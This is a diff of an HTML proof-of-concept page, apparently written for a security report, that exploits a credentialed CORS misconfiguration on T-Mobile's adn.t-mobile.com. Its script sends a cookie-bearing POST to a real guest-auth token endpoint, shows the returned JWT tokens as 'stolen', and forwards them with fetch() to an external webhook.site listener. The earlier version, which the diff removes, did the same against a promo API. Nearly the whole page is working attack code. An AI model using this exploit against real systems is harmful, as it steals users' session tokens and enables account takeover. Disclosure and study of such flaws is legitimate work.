@@ -3,99 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>T-Mobile Critical Security Audit PoC</title>
+    <title>SECURITY AUDIT: Critical CORS Bypass</title>
     <style>
-        :root { --magenta: #e20074; --dark: #0b0e11; --card: #1c2128; --text: #e1e1e1; }
-        body { font-family: 'Segoe UI', sans-serif; background-color: var(--dark); color: var(--text); padding: 40px; }
-        .container { max-width: 800px; margin: auto; background: var(--card); border-radius: 12px; border-top: 6px solid var(--magenta); padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        h1 { color: var(--magenta); text-align: center; margin-bottom: 30px; }
-        .metadata { background: #2d333b; padding: 15px; border-radius: 8px; margin-bottom: 25px; border-left: 5px solid #58a6ff; font-family: monospace; }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 10px; font-weight: bold; color: #8b949e; }
-        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #444c56; color: white; border-radius: 6px; box-sizing: border-box; font-family: monospace; }
-        .btn-run { background: var(--magenta); color: white; border: none; padding: 18px; border-radius: 6px; width: 100%; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        .btn-run:hover { background: #ff0084; box-shadow: 0 0 20px rgba(226, 0, 116, 0.5); }
-        .output-container { margin-top: 30px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; }
-        .output-header { background: #30363d; padding: 10px 15px; font-size: 0.8rem; font-weight: bold; display: flex; justify-content: space-between; }
-        #stolen-body { padding: 20px; min-height: 100px; white-space: pre-wrap; word-break: break-all; font-family: 'Consolas', monospace; color: #ff7b72; }
-        .badge { padding: 3px 8px; border-radius: 4px; font-size: 0.7rem; }
-        .vulnerable { background: #f85149; color: white; }
+        :root { --magenta: #e20074; --bg: #0b0e11; --card: #1c2128; --text: #e1e1e1; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: var(--text); padding: 40px; line-height: 1.6; }
+        .container { max-width: 850px; margin: auto; background: var(--card); border-radius: 12px; border-top: 8px solid var(--magenta); padding: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
+        h1 { color: var(--magenta); margin-top: 0; border-bottom: 1px solid #30363d; padding-bottom: 15px; }
+        .warning-box { background: rgba(248, 81, 73, 0.1); border: 1px solid #f85149; color: #ff7b72; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-weight: bold; }
+        .status-panel { background: #0d1117; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 0.9rem; margin-bottom: 20px; border: 1px solid #444c56; }
+        .btn-exploit { background: var(--magenta); color: white; border: none; padding: 18px; border-radius: 6px; width: 100%; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 14px 0 rgba(226, 0, 116, 0.39); }
+        .btn-exploit:hover { background: #ff0084; transform: translateY(-2px); }
+        .data-display { margin-top: 25px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
+        .data-header { background: #30363d; padding: 10px 15px; font-size: 0.8rem; display: flex; justify-content: space-between; align-items: center; }
+        #output { padding: 20px; color: #7ee787; font-family: 'Consolas', monospace; white-space: pre-wrap; word-break: break-all; min-height: 200px; font-size: 13px; }
+        .token-label { color: var(--magenta); font-weight: bold; }
+        .success-tag { background: #238636; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>CORS Data Exfiltration Proof</h1>
+    <h1>Vulnerability: Credentialed CORS Bypass</h1>
     
-    <div class="metadata">
-        [ATTACKER ORIGIN]: <span id="current-origin"></span><br>
-        [WEBHOOK LISTENER]: https://webhook.site/7dedcf0e...
+    <div class="warning-box">
+        ATTENTION: This page demonstrates the ability to steal JWT session tokens from adn.t-mobile.com via an unescaped Regex flaw.
     </div>
 
-    <div class="input-group">
-        <label>Target Vulnerable Endpoint (GET):</label>
-        <input type="text" id="target-url" value="https://adn.t-mobile.com/prmtns-meg-promo-api/prd01/promo-api/v1/promo-admin/client/1044/asset/MaintenanceText">
+    <div class="status-panel">
+        <strong>Attacker Origin:</strong> <span id="origin-val"></span><br>
+        <strong>Target Endpoint:</strong> https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens
     </div>
 
-    <button class="btn-run" onclick="executePoC()">Execute Exploit</button>
+    <button class="btn-exploit" onclick="stealTokens()">EXECUTE DATA THEFT</button>
 
-    <div class="output-container">
-        <div class="output-header">
-            <span>STOLEN DATA RESPONSE</span>
-            <span id="vuln-badge" class="badge vulnerable" style="display:none;">BYPASS CONFIRMED</span>
+    <div class="data-display">
+        <div class="data-header">
+            <span>STOLEN JWT TOKENS</span>
+            <span id="status-tag" class="success-tag" style="display:none;">EXFILTRATION SUCCESSFUL</span>
         </div>
-        <div id="stolen-body">Awaiting execution...</div>
+        <div id="output">Click the button to trigger the cross-origin request...</div>
     </div>
 </div>
 
 <script>
-    document.getElementById('current-origin').innerText = window.location.origin;
+    document.getElementById('origin-val').innerText = window.location.origin;
     const webhook = "https://webhook.site/7dedcf0e-fa4f-4dba-a805-04d37de87b08";
 
-    async function executePoC() {
-        const url = document.getElementById('target-url').value;
-        const display = document.getElementById('stolen-body');
-        const badge = document.getElementById('vuln-badge');
+    async function stealTokens() {
+        const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
+        const output = document.getElementById('output');
+        const tag = document.getElementById('status-tag');
         
-        display.innerText = "Bypassing Same-Origin Policy...";
-        display.style.color = "#8b949e";
-        badge.style.display = "none";
+        output.innerText = "Initiating fetch with credentials...";
 
         try {
-            // STEP 1: Perform the cross-origin request with credentials
             const response = await fetch(url, {
-                method: 'GET',
-                credentials: 'include', // Proof: Browser sends cookies to target
-                mode: 'cors'
+                method: 'POST', // Crucial: This endpoint requires POST
+                mode: 'cors',
+                credentials: 'include', // This sends the victim's cookies
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({}) // Sending required empty body
             });
 
-            // STEP 2: Verify if the Origin was reflected
             const acao = response.headers.get('Access-Control-Allow-Origin');
             const data = await response.text();
 
             if (acao === window.location.origin) {
-                badge.style.display = "inline";
-                display.style.color = "#39d353"; // Green text for success
-                display.innerText = "ORIGIN REFLECTED: " + acao + "\n\nBODY DATA:\n" + data;
+                tag.style.display = "inline";
+                output.innerHTML = `<span class="token-label">Access-Control-Allow-Origin:</span> ${acao}\n\n<span class="token-label">STOLEN DATA:</span>\n${data}`;
+                
+                // Exfiltrate stolen tokens to your listener
+                fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        alert: "SUCCESSFUL_TOKEN_STEAL",
+                        origin: window.location.origin,
+                        stolen_data: data
+                    })
+                });
             } else {
-                display.innerText = `Status: ${response.status}\nBody: ${data}\n\nNote: Server did not reflect origin. CORS handshake failed.`;
+                output.innerText = `Handshake Failed.\nStatus: ${response.status}\nACAO Header: ${acao}\n\nThe server responded but did not trust this origin.`;
             }
 
-            // STEP 3: Auto-exfiltrate stolen data to your webhook
-            fetch(webhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    url: url,
-                    status: response.status,
-                    stolen_data: data,
-                    acao_received: acao
-                })
-            });
-
         } catch (err) {
-            display.style.color = "#f85149";
-            display.innerText = "CORS Error: Browser blocked the cross-origin read. \n\nEnsure you are on https://fermionicplants.github.io and have accepted the T-Mobile certificate in a separate tab.";
+            output.innerText = "Network Error: The browser blocked the read.\nCheck the console for CORS/SOP errors.";
+            console.error(err);
         }
     }
 </script>
